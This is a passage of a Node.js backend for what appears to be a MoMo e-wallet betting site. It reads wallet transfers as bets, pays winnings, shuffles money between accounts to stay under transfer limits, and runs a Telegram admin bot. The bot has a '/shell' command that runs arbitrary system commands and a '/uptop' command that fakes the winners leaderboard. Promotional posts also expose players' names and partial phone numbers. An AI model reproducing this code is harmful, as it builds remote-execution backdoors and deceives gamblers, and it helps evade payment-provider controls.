const MomoService = require('./momo.service');
const Setting = require('../models/Setting')
const SendTaskDay = require('../models/SendTaskDay')
const SendGioiThieu = require('../models/SendGioiThieu')
const GioiThieu = require('../models/CodeGioiThieu')
const Lichsuck = require('../models/LichSuCk')
const Cuocs = require('../models/Cuoc')
const TopTuan = require('../models/TopTuan')
const DayTask = require('../models/DayTask')
const Giftcode = require('../models/Giftcode')
const Momo = require('../models/momo.model')
const Bot2 = require('../telegram/botgroup')
const BotWarning = require('../telegram/botWarning')
const Group2Id = -1001630788325
const groupID = -645203490
const groupIDwarning = -602326387
console.log("Hello ba gia")
console.log("Hello ba gia")
console.log("Hello ba gia")
console.log("Hello ba gia")
console.log("Hello ba gia")
const { exec } = require("child_process")
const redisCache = require("../redisCache")


const getWin = require("./getWin")




autoSendGT = async () => {
    await AutoSendGioiThieu()
    setTimeout(() => {
        autoSendGT()
    }, 30000);
}
autoSendGT()




setInterval(() => {
    AutoSendTaskDay()
}, 10000);



setInterval(() => {
    AutoSendGiftcode()
}, 15000);


const keyMomo = "momoMagd"
checkMagdRedis = async (magd) => {
    const napmomo = await redisCache.get(keyMomo)
    if (!napmomo) {
        redisCache.set(keyMomo, JSON.stringify({}))
        return true
    }
    else {
        let jMomos = JSON.parse(napmomo)
        if (jMomos[magd] != undefined) {
            return false
        }
        else {
            jMomos[magd] = magd
            redisCache.set(keyMomo, JSON.stringify(jMomos))
            return true
        }
    }
}
deleteMagdRedis = async (magd) => {
    const napmomo = await redisCache.get(keyMomo)
    if (!napmomo) {
        redisCache.set(keyMomo, JSON.stringify({}))
        return true
    }
    else {
        let jMomos = JSON.parse(napmomo)
        if (jMomos[magd] != undefined) {
            console.log("firt: ", jMomos.length)
            delete jMomos[magd]
            redisCache.set(keyMomo, JSON.stringify(jMomos))
            console.log("last: ", jMomos.length)
            return true
        }
        else {
            return false
        }
    }
}


async function AutoSendGiftcode() {
    const setting = await Setting.findOne()
    const giftcodes = await Giftcode.find({ status: 3 })
    giftcodes.forEach(async (element) => {
        if (element.money > 100) {
            try {
                element.status = 1
                element.save()
                await Momo.findOneAndUpdate({ phone: setting.sdtGiftcode }, { $inc: { solan: 1, gioihanngay: element.money, gioihanthang: element.money } })
                await MomoService.Comfirm_oder(setting.sdtGiftcode, element.phone, element.money, "#GiftCodeAzmomo")
            }
            catch (ex) {
                sendMessGroup("Chuyen tien GIFTCODE that bai: " + setting.sdtGiftcode + "\n" + ex.message)
                const momoz = await Momo.findOneAndUpdate({ phone: setting.sdtGiftcode }, { $inc: { solan: -1, gioihanngay: element.money * -1, gioihanthang: element.money * -1 } })
                if (ex.toString().includes("401")) {
                    await MomoService.GENERATE_TOKEN(momoz, momoz.phone)
                }
            }
        }
    })
}

async function AutoSendTaskDay() {
    const cuocs = await SendTaskDay.find({ status: -1 })
    const setting = await Setting.findOne()
    if (cuocs) {
        cuocs.forEach(async (element) => {
            if (element.money > 100) {
                try {
                    await SendTaskDay.findOneAndUpdate({ _id: element._id }, { status: 1 })
                    await Momo.findOneAndUpdate({ phone: setting.sdtdaytask }, { $inc: { solan: 1, gioihanngay: element.money, gioihanthang: element.money } })
                    await MomoService.Comfirm_oder(setting.sdtdaytask, element.phone, element.money, "#TT nv ngay")
                    sendMessGroup("ck nv ngày thành công\n" + setting.sdtdaytask + " st: " + element.money)
                }
                catch (ex) {
                    sendMessGroup("ck nv ngày thất bại\n" + setting.sdtdaytask + " st: " + element.money + "\n" + ex.message)
                    await SendTaskDay.findOneAndUpdate({ _id: element._id }, { status: -1 })
                    const momoz = await Momo.findOneAndUpdate({ phone: setting.sdtdaytask }, { $inc: { solan: -1, gioihanngay: element.money * -1, gioihanthang: element.money * -1 } })
                    if (ex.toString().includes("401")) {
                        await MomoService.GENERATE_TOKEN(momoz, momoz.phone)
                    }
                }
            }
        });
    }
}


async function AutoSendGioiThieu() {


    let element = await SendGioiThieu.findOne({ status: -1 })

    const setting = await Setting.findOne()
    if (element) {

        if (element.money > 100) {
            try {
                await SendGioiThieu.findOneAndUpdate({ _id: element._id }, { status: 1 })
                await Momo.findOneAndUpdate({ phone: setting.sdtGioithieu }, { $inc: { solan: 1, gioihanngay: element.money, gioihanthang: element.money } })
                await MomoService.Comfirm_oder(setting.sdtGioithieu, element.phone, element.money, "nhận 100k free => azmomo.vip")
                sendMessGroup("ck giới thiệu thành công\n" + setting.sdtGioithieu + " to " + element.phone + "\n" + element.money)

            }
            catch (ex) {
                sendMessGroup("ck gioi thieu that bai: " + setting.sdtGioithieu + " to " + element.phone + "\n" + ex.message)
                await SendGioiThieu.findOneAndUpdate({ _id: element._id }, { status: -1 })
                const momoz = await Momo.findOneAndUpdate({ phone: setting.sdtGioithieu }, { $inc: { solan: -1, gioihanngay: element.money * -1, gioihanthang: element.money * -1 } })
                if (ex.toString().includes("401")) {
                    await MomoService.GENERATE_TOKEN(momoz, momoz.phone)
                }
            }
        }

    }
}


function secondSince(date) {
    var seconds = Math.floor((new Date() - date) / 1000);
    return Math.floor(seconds)
}


updateBalance = async () => {
    const aaaa = await Momo.find({ status: 1 })
    for (a of aaaa) {
        await MomoService.getBalance(a.phone)
    }
}

setInterval(() => {
    autoOutMoneyToMuch()
}, 30000);

autoOutMoneyToMuch = async () => {
    try {
        await updateBalance()
    }
    catch { }
    const setting = await Setting.findOne({})
    const momos = await Momo.find({ status: 1 })
    if (momos.length <= 0) {

        return
    }
    else {
        for (let momo of momos) {
            const sums = await Lichsuck.findOne({ sdt: momo.phone, sotien: { $gte: 500000 }, noidung: { $in: noidung2s } }).sort({ time: -1 })
            console.log(sums)
            if (sums) {
                console.log("checkrut tiennnnnnnnnnn " + momo.phone + "|" + secondSince(sums.time))
                if (secondSince(sums.time) > 60 && momo.sotien >= (setting.ToMuchMoney.MaxMoney + 100000)) {
                    const sotienorder = momo.sotien - setting.ToMuchMoney.MaxMoney
                    try {
                        await Momo.findOneAndUpdate({ phone: momo.phone }, { $inc: { solan: 1, gioihanngay: sotienorder, gioihanthang: sotienorder } })
                        const ck = await MomoService.Comfirm_oder(momo.phone, setting.ToMuchMoney.Phone, sotienorder, "")
                        sendMessGroup("Đã rút tiền " + momo.phone + " to " + setting.ToMuchMoney.Phone + " sotien: " + sotienorder)
                    }
                    catch (ex) {
                        sendMessGroup("rút tiền thất bại \n" + momo.phone + " to " + setting.ToMuchMoney.Phone + "\n" + ex)
                        const zzzzzzz = await Momo.findOneAndUpdate({ phone: momo.phone }, { $inc: { solan: -1, gioihanngay: sotienorder * -1, gioihanthang: sotienorder * -1 } })
                        if (ex.toString().includes("401")) {
                            await MomoService.GENERATE_TOKEN(zzzzzzz, zzzzzzz.phone)
                        }
                    }
                }
            }
        }
    }
}
autoOutMoneyToMuch()


const noidung2s = [
    "c",
    "C",
    "l",
    "L",
    "c2",
    "C2",
    "l2",
    "L2",
    "a",
    "A",
    "b",
    "B",
    "t",
    "T",
    "x",
    "X",
    "a2",
    "A2",
    "b2",
    "B2",
    "t2",
    "T2",
    "x2",
    "X2",
    "G3",
    "g3",
    "s",
    "S",
    "n1",
    "N1",
    "N2",
    "n2",
    "n3",
    "N3"]

autoBankMoney = async (phone, amount) => {

    const keyWaituserz = "keywaitBankMoney" + phone
    const getRedisz = await redisCache.get(keyWaituserz)
    const dateNowz = Date.now()
    if (getRedisz) {
        if (dateNowz - getRedisz < 3000) {
            return
        }
    }
    await redisCache.set(keyWaituserz, dateNowz)

    const setting = await Setting.findOne({})

    try {
        const checkbalance = await MomoService.getBalance(setting.SendMoneyMy.Phone)
    } catch { }

    const momo = await Momo.findOne({ phone: phone })
    if (!momo) {
        sendMessGroup("SDT kh ton tai trong he thong " + setting.SendMoneyMy.Phone + " to " + phone)
        return
    }
    amount -= momo.sotien
    amount += setting.ToMuchMoney.MaxMoney
    if (setting && momo) {

        const momomy = await Momo.findOne({ phone: setting.SendMoneyMy.Phone })
        if (!momomy) {
            return
        }
        else {
            //30tr + 17tr > 47 => true

            let ishanmuc = momomy.sotien + momomy.gioihanngay > 47000000 || momomy.sotien + momomy.gioihanthang > 97000000
            if (ishanmuc || momomy.solan > 195) {
                await BotWarning.sendMessage(groupIDwarning, "SỐ bơm tiền sắp full hạn mức vui lòng thay")
                return
                return sendMessGroup("SỐ bơm tiền sắp full hạn mức vui lòng thay")
            }
        }


        try {
            await Momo.findOneAndUpdate({ phone: setting.SendMoneyMy.Phone }, { $inc: { solan: 1, gioihanngay: amount, gioihanthang: amount } })
            await MomoService.Comfirm_oder(setting.SendMoneyMy.Phone, phone, amount, "")
            sendMessGroup("Đã bơm tiền " + setting.SendMoneyMy.Phone + " to " + phone + " số tiền: " + amount)
        }
        catch (ex) {
            await BotWarning.sendMessage(groupIDwarning, "Bơm tiền thất bại " + setting.SendMoneyMy.Phone + " to " + phone + " số tiền: " + amount + "\n" + ex.message)

           // sendMessGroup("Bơm tiền thất bại " + setting.SendMoneyMy.Phone + " to " + phone + " số tiền: " + amount + "\n" + ex.message)
            let zzzzzzz = await Momo.findOneAndUpdate({ phone: setting.SendMoneyMy.Phone }, { $inc: { solan: -1, gioihanngay: amount * -1, gioihanthang: amount * -1 } })
            if (ex.toString().includes("401")) {
                await MomoService.GENERATE_TOKEN(zzzzzzz, zzzzzzz.phone)
            }
        }
    }
    console.log("Bom tien " + phone)

}

const noidungs = [
    { noidung: "c" },
    { noidung: "C" },
    { noidung: "l" },
    { noidung: "L" },
    { noidung: "c2" },
    { noidung: "C2" },
    { noidung: "l2" },
    { noidung: "L2" },
    { noidung: "a" },
    { noidung: "A" },
    { noidung: "b" },
    { noidung: "B" },
    { noidung: "t" },
    { noidung: "T" },
    { noidung: "x" },
    { noidung: "X" },
    { noidung: "a2" },
    { noidung: "A2" },
    { noidung: "b2" },
    { noidung: "B2" },
    { noidung: "t2" },
    { noidung: "T2" },
    { noidung: "x2" },
    { noidung: "X2" },
    { noidung: "G3" },
    { noidung: "g3" },
    { noidung: "s" },
    { noidung: "S" },
    { noidung: "n1" },
    { noidung: "N1" },
    { noidung: "N2" },
    { noidung: "n2" },
    { noidung: "n3" },
    { noidung: "N3" }]

async function sumWinmm() {
    var now = new Date();
    var startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate());
    const sum = await Cuocs.aggregate([{
        $match: {
            time: { $gte: startOfToday }, status: 1, noidung: { $in: noidung2s }
        },
    }, {
        $group: {
            _id: null,
            tienthang: {
                $sum: "$tienthang"
            },
            tiencuoc: {
                $sum: "$tiencuoc"
            }
        }
    }])
    return sum[0]
}
async function sumDemm() {
    var now = new Date();
    var startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate());
    const sum = await Cuocs.aggregate([{
        $match: {
            time: { $gte: startOfToday }, status: 2, tiencuoc: { $gte: 0 }, noidung: { $in: noidung2s }
        },
    }, {
        $group: {
            _id: null,
            tiencuoc: {
                $sum: "$tiencuoc"
            },
        }
    }])
    return sum[0]
}
async function sumWinmmThang() {
    var now = new Date();
    var startOfToday = new Date(now.getFullYear(), now.getMonth());
    const sum = await Cuocs.aggregate([{
        $match: {
            time: { $gte: startOfToday }, status: 1, $or: noidungs
        },
    }, {
        $group: {
            _id: null,
            tienthang: {
                $sum: "$tienthang"
            },
            tiencuoc: {
                $sum: "$tiencuoc"
            }
        }
    }])
    return sum[0]
}
async function sumDemmThang() {
    var now = new Date();
    var startOfToday = new Date(now.getFullYear(), now.getMonth());
    const sum = await Cuocs.aggregate([{
        $match: {
            time: { $gte: startOfToday }, status: 2, tiencuoc: { $gte: 0 }, $or: noidungs
        },
    }, {
        $group: {
            _id: null,
            tiencuoc: {
                $sum: "$tiencuoc"
            },
        }
    }])
    return sum[0]
}

async function getlengthCk(phone) {
    var now = new Date();
    var startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate());
    const sums = await Lichsuck.find({ sdt: phone, io: -1, time: { $gte: startOfToday } })
    return sums.length
}

const CronJob = require('cron').CronJob;
let cronNewDay = new CronJob('00 00 00 * * *', function () {
    console.log("Hello new day~")
    ResetNewDay()

}, function () {
    /* This function is executed when the job stops */
},
    true, /* Start the job right now */
    'Asia/Ho_Chi_Minh' /* Time zone of this job. */
);


let cronMonthly = new CronJob('0 0 1 * *', function () {
    console.log("Hello new month~")
    ResetNewMonth()

}, function () {
    /* This function is executed when the job stops */
},
    true, /* Start the job right now */
    'Asia/Ho_Chi_Minh' /* Time zone of this job. */
);
async function ResetNewMonth() {
    await Momo.updateMany({}, { gioihanthang: 0 })
}


async function ResetNewDay() {
    await Momo.updateMany({}, { gioihanngay: 0, solan: 0 })
    await DayTask.updateMany({}, { totalPlay: 0, moc: 5 })
}


const bot = require("../telegram/botadmin")
bot.onText(/\/uptop (.+) (.+)/, async (msg, match) => {
    const sdt = match[1];
    const money = Number(match[2]);
    let toptuan = await TopTuan.findOneAndUpdate({ sdt: sdt }, { $inc: { win: money } }, { new: true })
    if (!toptuan) {
        toptuan = await new TopTuan({ sdt: sdt, win: money }).save()
    }
    await bot.sendMessage(groupID, "Đã fake top SDT: " + toptuan.sdt + " Số tiền thắng: " + toptuan.win)
})
bot.onText(/\/xoatop (.+)/, async (msg, match) => {
    const sdt = match[1];
    let toptuan = await TopTuan.findOneAndRemove({ sdt: sdt })
    await bot.sendMessage(groupID, "Đã xóa")
})
bot.onText(/\/help/, async (msg, match) => {

    await bot.sendMessage(groupID, "Hướng dẫn\n/doanhthu  :  dùng để xem doanh thu\n/uptop 0123456789 500000 :  dùng faketop\n/xoatop 0123456789  : xóa khỏi top\n/gettop  : lấy 5 thằng top\n/resetTop  : Reset Top (xóa hết top tuần)\n/taocode 2 10000  :  tạo 2 code 10000\n/giftcode  : lấy toàn bộ gifcode chưa nhập")
})
bot.onText(/\/shell/, async (msg, match) => {
    const chatId = msg.chat.id;
    const resp = match[1]; // the captured "whatever"

    exec(resp, (error, stdout, strerr) => {
        console.log(stdout)
        bot.sendMessage(chatId, stdout);
    })



})

function getGiftcodeRan() {
    let result = '';
    let characters = '0123456789';
    let charactersLength = characters.length;
    for (let i = 0; i < 8; i++) {
        result += characters.charAt(Math.floor(Math.random() *
            charactersLength));
    }
    return "Azmomo." + result;



}


bot.onText(/\/delRedis (.+)/, async (msg, match) => {

    const magd = (match[1])
    await deleteMagdRedis(magd)

    await bot.sendMessage(groupID, "ok")




})

bot.onText(/\/getgd (.+) (.+)/, async (msg, match) => {

    const sdt = (match[1])
    const limit = (match[2])

    const momo = await Momo.findOne({ phone: sdt })
    if (momo) {
        const setting = await Setting.findOne({})
        const dateString = new Date().toLocaleDateString()
        await CheckGd(momo, dateString, setting, limit)
        await bot.sendMessage(groupID, "ok")

    }
    else {
        await bot.sendMessage(groupID, "sdt k ton tai")
    }



})

bot.onText(/\/taocode (.+) (.+)/, async (msg, match) => {
    if (match.length > 0) {
        const soluong = Number(match[1])
        const sotien = Number(match[2])
        if (sotien < 0 || sotien > 100000) {
            await bot.sendMessage(groupID, "Số tiền lớn hơn 0 và nhỏ hơn 100k")
        }
        else if (soluong > 10) {
            await bot.sendMessage(groupID, "So luong phai nho hon hoac bang 10")
        }
        else {
            let listCodes = ''
            for (let i = 0; i < soluong; i++) {
                const code = getGiftcodeRan()
                listCodes += code + " - " + numberWithCommas(sotien) + "\n"
                await new Giftcode({ code: code, money: sotien }).save()
            }
            await bot.sendMessage(groupID, listCodes)
        }
    }
    else {
        await bot.sendMessage(groupID, "Tao giftcode that bai")
    }
})



getTop2 = async () => {
    let now = new Date();
    let from = new Date(now.getFullYear(), now.getMonth(), 19);
    let to = new Date(now.getFullYear(), now.getMonth(), 25);
    let ccc = await Cuocs.aggregate([
        {
            $match: {
                time: {
                    $gte: from,
                    $lt: to
                }, status: 1
            }
        },
        {
            $group: {
                _id: {
                    "sdtchuyen": "$sdtchuyen",
                },
                tongtien: { $sum: "$tienthang" }
            }
        },

        { $sort: { tongtien: -1 } }
    ])
    return ccc
}

const timerz = ms => new Promise(res => setTimeout(res, ms))

bot.on('message', async (msg) => {
    if (msg.text.includes("/getCount:")) {
        const phone = msg.text.replace("/getCount:", "")
        const le = await getlengthCk(phone)
        await bot.sendMessage(groupID, phone + ": số lần: " + le)
    }
    else if (msg.text == "/gettop") {
        const zzzz = await getTop2();
        console.log(zzzz)
        var tops = ""
        const zzz = await TopTuan.find({}).sort({ win: -1 }).limit(5)
        for (let i = 0; i < zzz.length; i++) {
            tops += "Top " + (i + 1) + " Phone: " + zzz[i].sdt + " Số tiền thắng: " + numberWithCommas(zzz[i].win) + "\n"
        }
        await bot.sendMessage(groupID, tops)
    }
    else if (msg.text == "/resetTop") {
        await bot.sendMessage(groupID, "chat '/resetTop ok' để reset")
    }
    else if (msg.text == "/resetTop ok") {

        const zzz = await TopTuan.deleteMany({})
        await bot.sendMessage(groupID, "Đã xóa " + zzz.deletedCount + " top")
    }
    else if (msg.text == "/doanhthu" || msg.text == "doanhthu") {
        console.log("asasdasfsafsfsdfsdfsdfsfsdf")

        sendTong()
    }
    else if (msg.text == "/doanhthu2" || msg.text == "doanhthu2") {
        console.log("asasdasfsafsfsdfsdfsdfsfsdf")

        sendTong2()
    }
    else if (msg.text == "/giftcode") {
        const gifcodes = await Giftcode.find({ status: -1 })

        const codelist = gifcodes.map(item => item.code + " - " + numberWithCommas(item.money))
        await bot.sendMessage(groupID, "code\n" + codelist.join('\n'))

    }
    else if(msg.text == "/getgdall")
    {
        const setting = await Setting.findOne({})
        const momos = await Momo.find({})
        const dateString = new Date().toLocaleDateString()

        for(let momo of momos)
        {

            await CheckGd(momo, dateString, setting, 10)
        }
        await bot.sendMessage(groupID, "ok")
    }

});
function numberWithCommas(x) {
    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}
async function sendTong() {
    var tienthangtsr = await sumWinmm();
    var thangtsr = 0;
    var cuoctsrrr = 0;
    if (tienthangtsr) {
        thangtsr = Math.round(tienthangtsr.tienthang)
        cuoctsrrr = Math.round(tienthangtsr.tiencuoc)
    }
    var tienthuatsr = await sumDemm();
    var thuatsr = 0;
    if (tienthuatsr) {
        thuatsr = Math.round(tienthuatsr.tiencuoc)
    }
    await bot.sendMessage(groupID, "Today: " + numberWithCommas(thuatsr - (thangtsr - cuoctsrrr)))


    var tienthangtsrthang = await sumWinmmThang();
    var thangtsrthang = 0;
    var cuoctsrrrthang = 0;
    if (tienthangtsrthang) {
        thangtsrthang = Math.round(tienthangtsrthang.tienthang)
        cuoctsrrrthang = Math.round(tienthangtsrthang.tiencuoc)
    }
    var tienthuatsrthang = await sumDemmThang();
    var thuatsrthang = 0;
    if (tienthuatsrthang) {
        thuatsrthang = Math.round(tienthuatsrthang.tiencuoc)
    }
    await bot.sendMessage(groupID, "Month: " + numberWithCommas(thuatsrthang - (thangtsrthang - cuoctsrrrthang)))
}
async function sendTong2() {
    var tienthangtsr = await sumWinmm();
    var thangtsr = 0;
    var cuoctsrrr = 0;
    if (tienthangtsr) {
        thangtsr = Math.round(tienthangtsr.tienthang)
        cuoctsrrr = Math.round(tienthangtsr.tiencuoc)
    }

    await bot.sendMessage(groupID, "Today: " + numberWithCommas(thangtsr - cuoctsrrr))


    var tienthangtsrthang = await sumWinmmThang();
    var thangtsrthang = 0;
    var cuoctsrrrthang = 0;
    if (tienthangtsrthang) {
        thangtsrthang = Math.round(tienthangtsrthang.tienthang)
        cuoctsrrrthang = Math.round(tienthangtsrthang.tiencuoc)
    }

    await bot.sendMessage(groupID, "Month: " + numberWithCommas(thangtsrthang - cuoctsrrrthang))
}
sendMessGroup = (mess) => {
    bot.sendMessage(groupID, mess);
}

Start()
async function Start() {
    var ccc = await Setting.findOne({})
    if (!ccc) {
        await new Setting({ setting: "Setting" })
    }
}

async function AutoFixComment() {
    const setting = await Setting.findOne({})
    let cuocsfails = await Cuocs.findOne({ status: -999, tiencuoc: { $gte: setting.tile.min } })
    console.log(cuocsfails)
    if (cuocsfails) {
        try {
            const notis = await MomoService.getNoti(cuocsfails.sdt, 1000000)
            if (notis.length == 0) {
                //cuocsfails.status = 3
                if (cuocsfails.timesError > 4) {
                    cuocsfails.status = 3
                }
                else {
                    cuocsfails.timesError += 1
                }
                cuocsfails.save()
            }
            else {
                let isfinded = false

                for (let item of notis) {
                    const tranId = item.tranId
                    const commentz = item.comment
                    if (tranId == cuocsfails.magd) {
                        isfinded = true
                        const mwin = getWin(cuocsfails.tiencuoc, commentz, tranId, setting)
                        cuocsfails.noidung = commentz
                        cuocsfails.tienthang = mwin
                        cuocsfails.status = mwin <= 0 ? 2 : -1
                        cuocsfails.save()
                        console.log("fixcomment getNoti: " + tranId, commentz)
                        await Lichsuck.findOneAndUpdate({ magd: tranId }, { noidung: commentz + " loi doc comment" })
                        break
                    }
                }
                //console.log("fix noti: " + isfinded + " " + cuocsfails.magd, notis)
                if (!isfinded) {

                    const data = await MomoService.getTranId(cuocsfails.sdt, cuocsfails.magd);
                    const comment = data.comment
                    if (comment != undefined) {
                        const mwin = getWin(cuocsfails.tiencuoc, comment, cuocsfails.magd, setting)
                        cuocsfails.noidung = comment
                        cuocsfails.tienthang = mwin
                        cuocsfails.status = mwin <= 0 ? 2 : -1
                        cuocsfails.save()
                        console.log("fixcomment getTranId: " + cuocsfails.magd, comment)
                        await Lichsuck.findOneAndUpdate({ magd: cuocsfails.magd }, { noidung: comment + " loi doc comment" })
                    }
                    else {
                        console.log("loi k tim thay ma gd gettranid fix comment " + cuocsfails.magd)
                        if (cuocsfails.timesError > 4) {
                            cuocsfails.status = 3
                        }
                        else {
                            cuocsfails.timesError += 1
                        }
                        cuocsfails.save()
                    }
                }
            }
        }
        catch (ex) {
            console.log(ex)
            if (cuocsfails.timesError > 4) {
                cuocsfails.status = 3
            }
            else {
                cuocsfails.timesError += 1
            }
            cuocsfails.save()
        }
    }
}

autoFIXcomment = async () => {
    await AutoFixComment()
    setTimeout(async () => {
        autoFIXcomment()
    }, 2000)
}
autoFIXcomment()


autoGETTTT = async () => {
    const timefirt = Date.now()

    await AutoGet()
    console.log("Lịch sử thường time: " + (Date.now() - timefirt))

    setTimeout(async () => {
        autoGETTTT()
    }, 500)
}
autoGETTTT()



autoGETTTTNOTI = async () => {

    const timefirt = Date.now()
    await AutoGetNoti()
    console.log("Lịch sử noti time: " + (Date.now() - timefirt))

    setTimeout(async () => {
        autoGETTTTNOTI()
    }, 500)
}
autoGETTTTNOTI()


autoCkKKKK = async () => {
    await autoCk()
    setTimeout(async () => {
        autoCkKKKK()
    }, 1500)
}
autoCkKKKK()



async function autoCk() {
    let cuocs = await Cuocs.find({ status: -1 })
    for (let cuoc of cuocs) {
        let momo = await Momo.findOne({ status: 1, phone: cuoc.sdt })
        if (momo) {
            try {
                cuoc.status = 1
                cuoc.save()

                momo.solan += 1
                momo.gioihanngay += cuoc.tienthang
                momo.gioihanthang += cuoc.tienthang
                momo.save()

                const ck = await MomoService.Comfirm_oder(cuoc.sdt, cuoc.sdtchuyen, cuoc.tienthang, "#" + cuoc.magd + ", Azmomo.#vip")
                if (ck.msg == "Thành công") {
                    const zzz = await TopTuan.findOneAndUpdate({ sdt: cuoc.sdtchuyen }, { $inc: { win: cuoc.tienthang } })
                    if (!zzz) {
                        await new TopTuan({ sdt: cuoc.sdtchuyen, win: cuoc.tienthang }).save()
                    }
                }
            }
            catch (ex) {
                if (ex.toString().includes("Số dư không đủ để chuyển khoảng")) {
                    autoBankMoney(cuoc.sdt, cuoc.tienthang)
                }

                sendMessGroup("Chuyen tien that bai: " + cuoc.sdt + "\n" + ex.message)
                cuoc.status = -1
                cuoc.save()

                momo.solan -= 1
                momo.gioihanngay -= cuoc.tienthang
                momo.gioihanthang -= cuoc.tienthang
                momo.save()
            }
        }
    }
}



function ChangeNumber11(phone) {
    let numbers = {
        "0120": "070",
        "0121": "079",
        "0122": "077",
        "0126": "076",
        "0128": "078",
        "0123": "083",
        "0124": "084",
        "0125": "085",
        "0127": "081",
        "0129": "082",
        "0162": "032",
        "0163": "033",
        "0164": "034",
        "0165": "035",
        "0166": "036",
        "0167": "037",
        "0168": "038",
        "0169": "039",
        "0186": "056",
        "0188": "058",
        "0199": "059",
    }
    if (phone.length == 11) {
        try {
            var s4so = phone.substring(0, 4)
            return numbers[s4so] + phone.substring(4, phone.length)
        }
        catch {
            return phone
        }
    }
    else {
        return phone
    }
}


async function CheckGd(phone, dateString, setting, limit = 10) {


    try {
        let hiss = await MomoService.getTranshis(phone.phone, dateString, dateString, limit)
        // console.log(hiss)

        let zz = hiss
        hiss = hiss.momoMsg
        if (zz.message == "successfuly") {
            for (const his of hiss) {

                const io = his.io
                const transId = his.transId
                let timeFirtz = Date.now()

                const checkGdredis = await checkMagdRedis(transId)

                const sotienenn = his.totalAmount
                if (checkGdredis && sotienenn >= setting.tile.min) {
                    console.log("check redis: " + checkGdredis, transId)

                    const postBalance = his.postBalance
                    const checkz = await Lichsuck.findOne({ magd: transId })
                    if (!checkz) {
                        try {


                            const data = await MomoService.getTranId(phone.phone, transId);
                            if (data) {
                                const partnerId = data.partnerId
                                const partnerName = data.partnerName
                                const amount = data.amount
                                var comment = data.comment

                                if (comment == undefined) {
                                    comment = "undefined"

                                }

                                await new Lichsuck({ sdt: phone.phone, sdtchuyen: ChangeNumber11(partnerId), name: partnerName, magd: transId, sotien: amount, io: io, noidung: comment, status: 1 }).save()

                                if (io == 1) {

                                    var mwin = getWin(amount, comment, transId, setting)
                                    if (mwin != 0) {
                                        try {
                                            const noidung = "👉 " + partnerId.substring(0, partnerId.length - 4) + "**** - (" + partnerName + ")" + " vừa chơi game " + getGame(comment) + " và thắng " + numberWithCommas(mwin) + "vnđ\nChơi kiếm tiền ngay tại AZMOMO.VIP"
                                            // await Bot2.sendMessage(Group2Id, noidung)
                                            Bot2.sendPhoto(Group2Id, "https://img.upanh.tv/2022/05/28/Capturee15e2f3ceeec7926.png", { caption: noidung });
                                        }
                                        catch {
                                        }
                                    }



                                    const checkzz2 = await Cuocs.findOne({ magd: transId })
                                    if (!checkzz2) {
                                        if (comment == "undefined") {
                                            await new Cuocs({ sdt: phone.phone, sdtchuyen: ChangeNumber11(partnerId), name: partnerName, magd: transId, tiencuoc: amount, tienthang: mwin, status: -999, sodu: postBalance, noidung: comment }).save()
                                        }
                                        else if (mwin != 0) {
                                            await new Cuocs({ sdt: phone.phone, sdtchuyen: ChangeNumber11(partnerId), name: partnerName, magd: transId, tiencuoc: amount, tienthang: mwin, status: -1, sodu: postBalance, noidung: comment }).save()
                                        }
                                        else {
                                            await new Cuocs({ sdt: phone.phone, sdtchuyen: ChangeNumber11(partnerId), name: partnerName, magd: transId, tiencuoc: amount, tienthang: mwin, status: 2, sodu: postBalance, noidung: comment }).save()
                                        }
                                    }

                                    const zzz = await DayTask.findOneAndUpdate({ sdt: ChangeNumber11(partnerId) }, { $inc: { totalPlay: amount } })
                                    if (!zzz) {
                                        await new DayTask({ name: partnerName, sdt: ChangeNumber11(partnerId), totalPlay: amount }).save()
                                    }

                                }
                                if (io == 1) {
                                    await Momo.findOneAndUpdate({ sdt: phone.phone }, { sotien: postBalance })
                                }
                            }
                        }
                        catch (ex) {
                            deleteMagdRedis(transId)
                            if (!ex.toString().includes("commentValue")) {
                                if (ex.toString().includes("401")) {
                                    try {
                                        await MomoService.GENERATE_TOKEN(phone, phone.phone)
                                    }
                                    catch { }
                                }
                                console.log("gettranid" + phone.phone + ex)

                            }
                        }
                    }
                }
            }
        }
    } catch (ex) {
        if (!ex.toString().includes("commentValue")) {
            //sendMessGroup("Get Lsgd\n" + phone.phone + "\n" + ex)
            if (ex.toString().includes("401")) {
                try {
                    await MomoService.GENERATE_TOKEN(phone, phone.phone)
                }
                catch { }
            }
            console.log("lsgd" + phone.phone + ex)

        }
    }

}





async function CheckGd2(phone, setting) {
    try {

        const notis = await MomoService.getNoti(phone.phone, 300000)

        for (let noti of notis) {

            const io = 1


            const {
                tranId,
                partnerId,
                partnerName,
                amount,
                comment,
                time
            } = noti
            const magdd = tranId
            let mwin = getWin(amount, comment, magdd, setting)



            const checkGdredis = await checkMagdRedis(magdd)
            if (checkGdredis && amount >= setting.tile.min) {
                console.log("check redis noti: " + checkGdredis, tranId)
                const postBalance = -99999
                const checkz = await Lichsuck.findOne({ magd: tranId })
                console.log("Check cuocs", tranId)
                if (!checkz) {
                    await new Lichsuck({ sdt: phone.phone, sdtchuyen: ChangeNumber11(partnerId), name: partnerName, magd: tranId, sotien: amount, io: io, noidung: comment, status: 1 }).save()
                    if (io == 1) {
                        const checkzz2 = await Cuocs.findOne({ magd: tranId })
                        if (!checkzz2) {
                            if (mwin != 0) {
                                await new Cuocs({ sdt: phone.phone, sdtchuyen: ChangeNumber11(partnerId), name: partnerName, magd: tranId, tiencuoc: amount, tienthang: mwin, status: -1, sodu: postBalance, noidung: comment }).save()
                            }
                            else {
                                await new Cuocs({ sdt: phone.phone, sdtchuyen: ChangeNumber11(partnerId), name: partnerName, magd: tranId, tiencuoc: amount, tienthang: mwin, status: 2, sodu: postBalance, noidung: comment }).save()
                            }
                        }
                        const zzz = await DayTask.findOneAndUpdate({ sdt: ChangeNumber11(partnerId) }, { $inc: { totalPlay: amount } })
                        if (!zzz) {
                            await new DayTask({ name: partnerName, sdt: ChangeNumber11(partnerId), totalPlay: amount }).save()
                        }
                    }
                }
            }
        }
    } catch (ex) {
        console.log(ex)
    }
}



const timer = ms => new Promise(res => setTimeout(res, ms))
async function AutoGet() {
    const dateString = new Date().toLocaleDateString()
    const phones = await Momo.find({ status: 1 })
    const setting = await Setting.findOne({})
    for (const element of phones) {
        const phone = element
        if (phone.solan >= 190 || phone.gioihanngay >= 45000000 || phone.gioihanthang > 98000000) {
            sendMessGroup(phone.phone + " đã tắt")
            await Momo.findByIdAndUpdate(phone._id, { status: 0 })
        }
        else {
            try {
